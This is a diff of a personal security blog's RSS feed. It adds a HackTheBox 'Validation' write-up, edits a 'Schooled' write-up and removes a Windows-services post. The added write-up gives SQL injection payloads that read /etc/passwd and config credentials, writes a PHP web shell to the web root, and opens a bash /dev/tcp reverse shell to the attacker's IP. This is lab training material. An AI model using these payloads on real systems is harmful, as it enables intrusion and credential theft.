@@ -5,7 +5,202 @@
     <link>https://fahmifj.github.io/</link>
     <description>Recent content on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Thu, 16 Sep 2021 18:22:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 24 Sep 2021 19:11:30 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Validation</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-validation/</link>
+      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-validation/</guid>
+      <description>Validation is a machine from UHC September qualifiers and currently live in Hack The Box as retired machine with easy difficulty. It starts with enumeration on a website and identify a second order SQL injection. The SQL user can use various SQL functions, two of which allows for file read and file write. With file read ability, the web config which contains database credentials can be read. With the ability to write file and write permission on the web root, it is possible to drop a web shell to gain a foothold on the system.</description>
+      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a> is a machine from UHC September qualifiers and currently live in Hack The Box as retired machine with easy difficulty. It starts with enumeration on a website and identify a second order SQL injection. The SQL user can use various SQL functions, two of which allows for file read and file write. With file read ability, the web config which contains database credentials can be read. With the ability to write file and write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for database is found to be re-used by the root account.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Web enumeration</li>
+<li>SQL injection</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
+$ fscan 10.10.11.116 validation
+nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
+Nmap scan report <span class="k">for</span> 10.10.11.116
+Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
+
+PORT     STATE    SERVICE        VERSION
+22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
+<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
+4566/tcp open     http           nginx
+<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+5000/tcp filtered upnp
+5001/tcp filtered commplex-link
+5002/tcp filtered rfe
+5003/tcp filtered filemaker
+5004/tcp filtered avt-profile-1
+5005/tcp filtered avt-profile-2
+5006/tcp filtered wsm-server
+5007/tcp filtered wsm-server-ssl
+5008/tcp filtered synapsis-edge
+8080/tcp open     http           nginx
+<span class="p">|</span>_http-title: <span class="m">502</span> Bad Gateway
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.07 seconds
+</code></pre></div><p>The filtered ports indicate that there are some firewall/IP table rules applied on the machine.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Port 80 presents a registration page of UHC. Adding <code>index.php</code> reveals that it&rsquo;s PHP site.</p>
+<p><div class="img-container"><img src="imgs/image-20210923035321832.png" alt="image-20210923035321832"  /></div>
+</p>
+<p>I can register on it, and it redirects to <code>/account.php</code>. The submitted inputs (country and username) are reflected back here, and this can be an indicator for injection point.</p>
+<p><div class="img-container"><img src="imgs/image-20210923040838459.png" alt="image-20210923040838459"  /></div>
+</p>
+<p>The HTTP request for register, which was previously intercepted using Burp Suite, is as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
+<span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.11.116</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.11.116/index.php</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+username=choropys&amp;country=Indonesia
+</code></pre></div><p>And the server responses with <code>302</code> which redirects to <code>/account.php</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="n">Date</span><span class="o">:</span> <span class="l">Wed, 22 Sep 2021 21:08:19 GMT</span>
+<span class="n">Server</span><span class="o">:</span> <span class="l">Apache/2.4.48 (Debian)</span>
+<span class="n">X-Powered-By</span><span class="o">:</span> <span class="l">PHP/7.4.23</span>
+<span class="n">Set-Cookie</span><span class="o">:</span> <span class="l">user=f1bffe3047f1550d765a66e3ac54515c</span>
+<span class="n">Location</span><span class="o">:</span> <span class="l">/account.php</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
+</code></pre></div><p>The response also contains a cookie that just the <code>md5sum</code> from of the username.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
+$ <span class="nb">echo</span> -n <span class="s1">&#39;choropys&#39;</span> <span class="p">|</span> md5sum                                                                 
+f1bffe3047f1550d765a66e3ac54515c
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="sql-injection">SQL injection</h3>
+<h4 id="detection">Detection</h4>
+<p>When I submit another registration request with the following payload,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">10.10.11.116</span>
+
+<span class="g">...[SNIP]...
+</span><span class="g">
+</span><span class="g">username=choropys&#39;&amp;country=Indonesia&#39;
+</span></code></pre></div><p>and then immediately navigate to <code>/account.php</code>, the page shows an error message.</p>
+<p><div class="img-container"><img src="imgs/image-20210923041509664.png" alt="image-20210923041509664"  /></div>
+</p>
+<p>If I search for  <code>fetch_assoc()</code>, it&rsquo;s a PHP function that typically used to handle database records.</p>
+<p>Now if I change the <code>country</code>  value to <code>Indonesia' -- #</code> , the page doesn&rsquo;t error out.</p>
+<p><div class="img-container"><img src="imgs/image-20210923041604118.png" alt="image-20210923041604118"  /></div>
+</p>
+<p>From here, I can assume that the site is vulnerable to SQL injection.</p>
+<p>I will submit <code>country=Indonesia'ORDER BY 1,2 -- #</code> to identify the number of available columns, and the <code>/account.php</code> page returns with the same error.</p>
+<p><div class="img-container"><img src="imgs/image-20210923042953130.png" alt="image-20210923042953130"  /></div>
+</p>
+<p>So the query in the backend only wants a single column.</p>
+<h4 id="leak-source">Leak source</h4>
+<p>I couldn&rsquo;t find any credentials on the database, but I found out that the MySQL <code>load_file()</code> function isn&rsquo;t restricted. I can read the <code>/etc/passwd</code> file using that function.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT load_file(&#39;/etc/passwd&#39;) -- #
+</code></pre></div><p>When I refresh <code>/account.page</code></p>
+<p><div class="img-container"><img src="imgs/image-20210923043603480.png" alt="image-20210923043603480"  /></div>
+</p>
+<p>Since the location of <code>account.php</code> has been leaked by the error message, I can try to load that file with <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. When I refresh the <code>account.php</code> page and view its source, the source code of <code>account.php</code> is there, and it also leak the configuration file.</p>
+<p><div class="img-container"><img src="imgs/image-20210923044030733.png" alt="image-20210923044030733"  /></div>
+</p>
+<p>I can try to read <code>config.php</code> by changing my payload to <code>country='UNION SELECT load_file('/var/www/html/account.php') -- #</code>. The configuration file contains database credentials.</p>
+<p><div class="img-container"><img src="imgs/image-20210923044108761.png" alt="image-20210923044108761"  /></div>
+</p>
+<p>I will note these credentials.</p>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="web-shell">Web shell</h4>
+<p>I also find that writing file is allowed on <code>/var/www/html/</code>, therefore I could put a web shell there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">username=choropys&amp;country=&#39;UNION SELECT &#34;&lt;?php system($_REQUEST[c]); ?&gt;&#34; INTO OUTFILE &#34;/var/www/html/chrp.php&#34; -- #	
+</code></pre></div><p>And now I have code execution.</p>
+<p><div class="img-container"><img src="imgs/image-20210923045051661.png" alt="image-20210923045051661"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>The system does have bash but it my reverse shell doesn&rsquo;t work with GET method, so I changed the request to use POST method and URL encode the payload.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">c=/bin/bash+-c+&#34;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.5/21+0&gt;%261&#34;
+</code></pre></div><p>On my listener</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «validation» «10.10.14.5» 
+$ nc -nvlp <span class="m">21</span>                                                
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">21</span> ...
+connect to <span class="o">[</span>10.10.14.5<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.116<span class="o">]</span> <span class="m">37096</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+www-data@validation:/var/www/html$ id 
+id 
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div><p>I will upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/var/www/html$ which script
+which script
+/usr/bin/script
+www-data@validation:/var/www/html$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is <span class="s1">&#39;/dev/null&#39;</span>.
+www-data@validation:/var/www/html$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> suspended  nc -nvlp <span class="m">21</span>
+→ root@kali «exploits» «10.10.14.49» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">113</span> continued  nc -nvlp <span class="m">21</span>
+
+www-data@validation:/var/www/html$ 
+</code></pre></div><p>The root flag is readable by others, so I could grab it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/home/htb$ ls -lR /home
+/home:
+total <span class="m">4</span>
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">9</span> 12:09 htb
+
+/home/htb:
+total <span class="m">4</span>
+-rw-r--r-- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 user.txt
+</code></pre></div><p>I also noticed that I&rsquo;m inside a Docker container because there is <code>.dockerenv</code> at the root file system</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ ls -l .dockerenv
+-rwxr-xr-x <span class="m">2</span> root root <span class="m">0</span> Sep <span class="m">16</span> 13:39 .dockerenv
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="su-root">su root</h4>
+<p>On the previous enumeration using SQLi, I didn&rsquo;t see user <strong>htb</strong> is listed in the <code>/etc/passwd</code> file, and it&rsquo;s only <strong>root</strong> that has login shell. So I tried the database password I obtained from the <code>config.php</code> file on <strong>root</strong>, and it worked.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@validation:/$ su -   
+su -
+Password: uhc-9qual-global-pw
+
+root@validation:~# 
+</code></pre></div><p>I thought I need to escape from this container, but when I checked the <code>/root</code> directory, the root flag is there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@validation:/# ls -l /root 
+-r-------- <span class="m">2</span> root root <span class="m">33</span> Sep <span class="m">22</span> 22:14 root.txt
+</code></pre></div><p>I also thought that a player has left the copy of root flag from the host in this container. But, after I watched the <a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI">official walkthrough</a> video by ippsec and read the <a href="https://0xdf.gitlab.io/2021/09/14/htb-validation.html">writeup</a> by 0xdf, the box just ends this way 😅.</p>
+<hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Schooled</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
@@ -13,7 +208,7 @@
       
       <guid>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</guid>
       <description>Moodle exploitation using CVEs</description>
-      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. The user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and this can be exploited to gain root access.</p>
+      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
 <h4 id="skills-learned">Skills Learned</h4>
 <ul>
 <li>Stealing cookie with XSS</li>
@@ -180,7 +375,7 @@ Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=<
 <p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
 <p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
 </p>
-<p>Now I can confirm that this Moodle version by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>, and it&rsquo;s 3.9.</p>
+<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
 </p>
 <h3 id="shell-as-www-data">Shell as www-data</h3>
@@ -198,7 +393,7 @@ Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=<
 <p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
 <p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
 </p>
-<p>With manager role, I have the ability to impersonate my participants, which means they have to be on my course (mathematics) firstm using &ldquo;Login as&rdquo; function. For example:</p>
+<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
 <p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
 </p>
 <p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
@@ -395,12 +590,12 @@ Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span c
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
 $ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
 </code></pre></div><blockquote>
-<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to use subshell and invoke the transfer command.</p>
+<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
 </blockquote>
 <p>On Schooled:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
 Connection from 10.10.14.49 <span class="m">60744</span> received!
-</code></pre></div><p>I will set a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
+</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
 pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
 pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
@@ -1143,218 +1338,6 @@ c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">echo</span>  <span class="s1">&#39;alias gedit=&#34;gedit-null&#34;&#39;</span>  &gt; ~/.zshrc
 $ <span class="nb">source</span> ~/.zshrc
 </code></pre></div>]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>Windows Services: Start a Service During Its Creation</title>
-      <link>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</link>
-      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</guid>
-      <description>Eksplorasi Windows Service</description>
-      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas soal Windows Service (selanjutkan akan disebut service). Post pertama merupakan bagian dari seri &ldquo;beyond root&rdquo;-nya <a href="https://twitter.com/0xdf_">0xdf</a>, bisa dibaca <a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html#reverse-powershell">disini</a>. Sedangkan post kedua adalah post dari <a href="https://twitter.com/VbScrub">VbScrub</a>, bisa di baca <a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">disini</a>. Di post pertama, sebenarnya 0xdf <em>ngulik</em> soal psexec-nya Impacket, tapi masih terkait dengan Service. Hubungan post pertama dengan post kedua adalah si VbScrub melanjutkan <em>kulikan</em>-nya 0xdf dan membahas lebih detail tentang Service-nya.</p>
-<p>Berkat kedua postingan tersebut, jadi ikutan untuk lihat-lihat dokumentasi API Windows service.</p>
-<blockquote>
-<p>*Ngulik itu sebangsa ngoprek 😅</p>
-</blockquote>
-<p>Pada Windows, Service sendiri adalah sebutan suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, sebutannya adalah Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p>
-<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
-</p>
-<h2 id="creation-of-a-service">Creation of a Service</h2>
-<p>Sebelum melanjutkan tentang kedua postingan tadi, ada baiknya kita tahu dulu cara membuat sebuah service dan bagaimana prosesnya di belakang layar.</p>
-<p>Nah, Windows sendiri menyediakan sebuah command-line utility bernama <code>sc.exe</code> untuk mengelola hal-hal terkait Service. Kita bisa menggunakan utility tersebut untuk membuat sebuah Service, misalnya:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span>
-</code></pre></div><ul>
-<li>MyService = Nama service</li>
-<li>binPath = Lokasi executable program (+ argument)</li>
-</ul>
-<p>Kedua argumen diatas wajib disuplai (minimal).</p>
-<p>Pembuatan service <code>MyService</code> akan berhasil jika perintah tersebut diketikkan pada elevated (admin) terminal , atau si user memiliki hak CreateService (diizinkan untuk membuat service).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
-<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
-</code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasilnya adalah &ldquo;Access is denied&rdquo;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
-<span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:
-
-Access is denied.
-</code></pre></div><p>Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service dibelakang layar, kita bisa mengacu ke kode dalam bahasa C pada <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">dokumentasi Microsoft</a> berikut.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
-    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
-    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
-
-    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-     <span class="c1">// Creation of a Service: STEP 1
-</span><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
-</span><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span>
-        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
-</span><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-     <span class="c1">// Creation of a Service: STEP 2
-</span><span class="c1"></span>    <span class="c1">// Create the service
-</span><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
-        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
-</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
-</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
-</span><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
-</span><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
-</span><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
-</span><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
-</span><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-
-    <span class="c1">// Creation of a Service: STEP 3
-</span><span class="c1"></span>    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
-    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p>
-<ol>
-<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">OpenSCManager</a>. Fungsi ini mengembalikan sesuatu (return value) yang disebut <strong>handle</strong> (selanjutnya disebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles">handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li>
